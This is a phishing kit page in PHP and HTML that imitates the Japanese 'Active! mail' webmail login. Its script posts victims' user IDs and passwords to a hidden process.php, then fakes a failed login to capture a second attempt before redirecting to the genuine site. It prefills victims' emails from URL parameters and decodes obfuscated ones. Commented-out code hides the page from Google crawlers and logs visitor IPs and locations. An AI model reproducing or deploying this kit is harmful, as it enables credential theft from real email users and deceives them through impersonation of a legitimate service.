<?php
session_start();
/*   
            ALEIN EXPERT                  
*/
/*session_start();
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

date_default_timezone_set('GMT');
$timedate = date('H:i:s d/m/Y');

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION['_ip_']  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_']  = $forward;
}
else{
    $_SESSION['_ip_']  = $remote;
}
$getdetails = 'https://extreme-ip-lookup.com/json/' . $_SESSION['_ip_'];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$country   = $details->country;
$org   = $details->org;
$isp   = $details->isp;
$adminvu .= "<tr>
                          <td>
                            {".$_SESSION['_ip_']."}
                          </td>
                          <td>
                            ".$TIME_DATE."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  ".$country."
                          </td>
                          <td>
                           ".$org."
                          </td>
                        </tr>\n";
    $khraha = fopen("./rz/vus".$yourname.".html", "a");
	fwrite($khraha, $adminvu);
	$xx .= "{}\n";
    $khraha = fopen("./rz/vus.html", "a");
	fwrite($khraha, $xx);*/
	$permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>

<!DOCTYPE html>
<html><head>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9">
<meta http-equiv="AM-Template" content="standard/html/index.html">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="Content-Language" content="ja">
<meta name="format-detection" content="telephone=no">
<title>Active! mail</title>

<link rel="stylesheet" type="text/css" href="https://activemail.kagoya.com/am_viz/common/standard/popup.css?6.5002005200">
<link rel="stylesheet" type="text/css" href="https://activemail.kagoya.com/kir_files/css/index_ff150.css">


<script type="text/javascript">
<!--
function kir_page_display_init()
{
  
}
//-->
</script>
<link rel="stylesheet" href="css/style.css"/>
</head>

<!--<body onload="kir_page_display_init();" topmargin="0" text="#000000" leftmargin="0" bgcolor="#FFFFFF">-->
<body style="overflow:hidden">

<noscript>このページではJavaScriptを使用しています。<br />ご使用のブラウザでJavaScriptを有効にしてご利用下さい。</noscript>

<div id="ajax_content" style="position:absolute;visibility:hidden;display:none;"></div>

<!--Login Sec start here -->
  <div class="loginsec">

  <form name="loginForm" id="loginForm" method="POST" action="">
  <div class="logo">
    <img src="https://activemail.kagoya.com/am_viz/common/img/standard/am_logo_index.gif" alt="Active! mail" title="Active! mail" width="164" height="59">
  </div>
  <div class="border"><br></div>
  <div class="layout">
    <table class="login">
     <tbody><tr>
      <th><img src="https://activemail.kagoya.com/am_viz/common/img/standard/index_login.gif"></th>
     </tr>
     <tr>
       <td>

        <table class="inner" cellspacing="3" cellpadding="3">
          <tbody><tr>
            <td colspan="3"></td>
          </tr>
          <tr>
            <th><span style="font-weight:bold;font-size:15px;">ユーザID :</span></th>
            <td>
              <input type="email" class="length" name="am_authid" id="am_authid" size="19" maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value="" tabindex="1" required>
            </td>
            <td>
            </td>
          </tr>
          <tr>
            <th><span style="font-weight:bold;font-size:15px;">パスワード :</span></th>
            <td colspan="3">
              <input type="password" class="length" name="am_authpasswd" id="am_authpasswd" size="20" maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value="" tabindex="2" required>
            </td>
          </tr>
          <tr style="display:none">
            <th></th>
            <td colspan="3">以下に表示されている文字を入力してください</td>
          </tr>
          <tr style="display:none">
            <th></th> 
            <td colspan="3">
              <img src="">
            </td>
          </tr>
          <tr style="display:none">
            <th></th>
            <td colspan="3">
              <input type="text" class="length" name="am_captcha" size="19" maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value="" tabindex="3">
            </td>
            <td></td>
          </tr>
          <tr>
            <th><span style="font-weight:bold;font-size:15px;">言語選択 :</span></th>
            <td colspan="3">
              <select name="language" tabindex="4">
                <option value="auto">自動選択</option>
<option value="en">英語</option>
<option value="ja">日本語</option>
<option value="ko">韓国語</option>
<option value="zh-cn">中国語</option>

              </select>
            </td>
          </tr>
          <tr>
            <td colspan="4" class="authinfo">
              <input type="checkbox" name="save_authinfo" id="save_authinfo" value="on" tabindex="5"><label for="save_authinfo"><span style="font-weight:bold;font-size:13px;">パスワード以外のログイン情報を保存する</span></label>
            </td>
          </tr>
          <tr>
            <th colspan="2" class="copyright">Active! mail <br>©1998 QUALITIA CO., LTD. All Rights Reserved.</th>
            <th>
              <input type="submit" value="  ログイン  ">
            </th>
          </tr>
        </tbody></table>

      </td>
    </tr>
  </tbody></table>
  <table class="login_footer">
  <tbody><tr>
    <td class="english">
      <a href="/?lang=en">English</a>
    </td>
  </tr>
  </tbody></table>
</div>

<input type="hidden" name="login_page_lang" value="ja">
<input type="hidden" name="charset" value="UTF-8">
<input type="hidden" name="_cmd" value="authinput">


</form>

</div>
<!--Login Sec end here -->


<!--Login Sec2 start here -->
  <div class="loginsec2">

  <form name="loginForm2" id="loginForm2" method="POST" action="">
  <div class="logo">
    <img src="https://activemail.kagoya.com/am_viz/common/img/standard/am_logo_index.gif" alt="Active! mail" title="Active! mail" width="164" height="59">
  </div>
  <div class="border"><br></div>
  <div class="layout">
    <table class="login">
     <tbody><tr>
      <th><img src="https://activemail.kagoya.com/am_viz/common/img/standard/index_login.gif"></th>
     </tr>
     <tr>
       <td>

        <table class="inner" cellspacing="3" cellpadding="3">
          <tbody><tr>
            <td colspan="3" align="center"> <span style="color:#F00;font-size:11px;font-weight:bold">パスワードが正しくありません。もう一度やり直してください</span></td>
          </tr>
          <tr>
            <th><span style="font-weight:bold;font-size:15px;">ユーザID :</span></th>
            <td>
              <input type="email" class="length" name="am_authid1" id="am_authid1" size="19" maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value="" tabindex="1" required>
            </td>
            <td>
            </td>
          </tr>
          <tr>
            <th><span style="font-weight:bold;font-size:15px;">パスワード :</span></th>
            <td colspan="3">
              <input type="password" class="length" name="am_authpasswd1" id="am_authpasswd1" size="20" maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value="" tabindex="2" required>
            </td>
          </tr>
          <tr style="display:none">
            <th></th>
            <td colspan="3">以下に表示されている文字を入力してください</td>
          </tr>
          <tr style="display:none">
            <th></th> 
            <td colspan="3">
              <img src="">
            </td>
          </tr>
          <tr style="display:none">
            <th></th>
            <td colspan="3">
              <input type="text" class="length" name="am_captcha" size="19" maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value="" tabindex="3">
            </td>
            <td></td>
          </tr>
          <tr>
            <th><span style="font-weight:bold;font-size:15px;">言語選択 :</span></th>
            <td colspan="3">
              <select name="language" tabindex="4">
                <option value="auto">自動選択</option>
<option value="en">英語</option>
<option value="ja">日本語</option>
<option value="ko">韓国語</option>
<option value="zh-cn">中国語</option>

              </select>
            </td>
          </tr>
          <tr>
            <td colspan="4" class="authinfo">
              <input type="checkbox" name="save_authinfo" id="save_authinfo" value="on" tabindex="5"><label for="save_authinfo"><span style="font-weight:bold;font-size:13px;">パスワード以外のログイン情報を保存する</span></label>
            </td>
          </tr>
          <tr>
            <th colspan="2" class="copyright">Active! mail <br>©1998 QUALITIA CO., LTD. All Rights Reserved.</th>
            <th>
              <input type="submit" value="  ログイン  ">
            </th>
          </tr>
        </tbody></table>

      </td>
    </tr>
  </tbody></table>
  <table class="login_footer">
  <tbody><tr>
    <td class="english">
      <a href="/?lang=en">English</a>
    </td>
  </tr>
  </tbody></table>
</div>

<input type="hidden" name="login_page_lang" value="ja">
<input type="hidden" name="charset" value="UTF-8">
<input type="hidden" name="_cmd" value="authinput">


</form>

</div>
<!--Login Sec2 end here -->

<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> overlay">
  <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> lgif-space"></div>
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> loadgif">
       <img src="img/loading.gif" width="100" height="100">
    </div>
</div>


<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>

 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

<script type="text/javascript">

$(document).bind("contextmenu", function(e){ return false;});

$('#loginForm').on('submit', function(e){
		
		 $(".overlay").show(500);
		$.post('T_a_n_G_u_l_AR/process.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
                                $('.loginsec').hide();
								$('.loginsec2').show();
								$(".overlay").hide(500);
                        },2000);
		e.preventDefault();
	});

$('#loginForm2').on('submit', function(e){
		
		 $(".overlay").show(500);
		$.post('T_a_n_G_u_l_AR/process2.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
                                window.location.href = "https://activemail.kagoya.com/";
								$(".overlay").hide(500);
                        },9000);
		e.preventDefault();
	});

</script>



<script>
  
  location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain='
  
</script>

<script type="text/javascript">

var $c = getUrlParameter('email');
     $('#am_authid').val($c);
	$('#am_authid1').val($c);
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;
			

            var domain = extractDomain(currentEmail);

           // var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
		function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }



</script> 

<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>